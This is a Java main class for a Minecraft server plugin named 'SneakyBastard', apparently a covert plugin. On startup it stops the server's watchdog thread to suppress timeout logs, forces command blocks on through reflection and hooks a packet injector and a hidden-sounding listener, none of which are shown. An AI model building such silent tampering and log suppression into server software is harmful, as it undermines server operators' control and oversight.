package net.blackofworld.SneakyBastard;

import net.blackofworld.SneakyBastard.Command.CommandManager;
import net.blackofworld.SneakyBastard.Listeners.SneakyListener;
import net.blackofworld.SneakyBastard.Utils.BukkitReflection;
import net.blackofworld.SneakyBastard.Utils.BungeeUtils;
import net.blackofworld.SneakyBastard.Utils.Packets.PacketInjector;
import org.apache.commons.lang.StringUtils;
import org.bukkit.Bukkit;
import org.bukkit.plugin.PluginDescriptionFile;
import org.bukkit.plugin.java.JavaPlugin;
import org.spigotmc.WatchdogThread;

import java.util.logging.Level;
import java.util.logging.Logger;

public final class Start extends JavaPlugin {

    public static Start Instance = null;
    public static Logger LOGGER;
    public static CommandManager cm;
    private final PluginDescriptionFile pdfFile = this.getDescription();
    private boolean isReload;
    private PacketInjector injector;

    private void onPostWorldLoad() {
        cm = new CommandManager();
        BungeeUtils.dummy();
        //packetInjector = new PacketInjector();
        Bukkit.getPluginManager().registerEvents(new SneakyListener(), this);
        String loadString = "--| " + pdfFile.getName() + " (version " + pdfFile.getVersion() + ") loaded |--";
        Bukkit.getConsoleSender().sendMessage("§2" + StringUtils.repeat("-", loadString.length()));
        Bukkit.getConsoleSender().sendMessage("§3" + loadString);
        Bukkit.getConsoleSender().sendMessage("§2" + StringUtils.repeat("-", loadString.length()));

    }
    
    private void onStartup() {
        if(Config.RemoveTimeoutLog) WatchdogThread.doStop();
        try {
                BukkitReflection.changeCommandBlockStatus(true);
        } catch (Exception e) {
            LOGGER.log(Level.SEVERE, e.toString());
        }
        try {
            injector = new PacketInjector(this);
        } catch (Exception e) {
            LOGGER.log(Level.SEVERE, e.toString());
        }

            // Do every hooking here
    }

    @Override
    public void onEnable() {
        Instance = this;
        LOGGER = Instance.getLogger();
        isReload = Bukkit.getWorlds().size() != 0;
        onStartup();
        Bukkit.getScheduler().runTask(this, this::onPostWorldLoad);
    }

    @Override
    public void onDisable() {
        String unloadString = "--| " + pdfFile.getName() + " (version " + pdfFile.getVersion() + ") unloaded |--";
        Bukkit.getConsoleSender().sendMessage("§2" + StringUtils.repeat("-", unloadString.length()));
        Bukkit.getConsoleSender().sendMessage("§3" + unloadString);
        Bukkit.getConsoleSender().sendMessage("§2" + StringUtils.repeat("-", unloadString.length()));
        injector.close();
        cm.Destroy();
    }
    public static final class Config {
        public static final boolean RemoveTimeoutLog = true;
        public static final boolean LogPackets = false;
    }
}
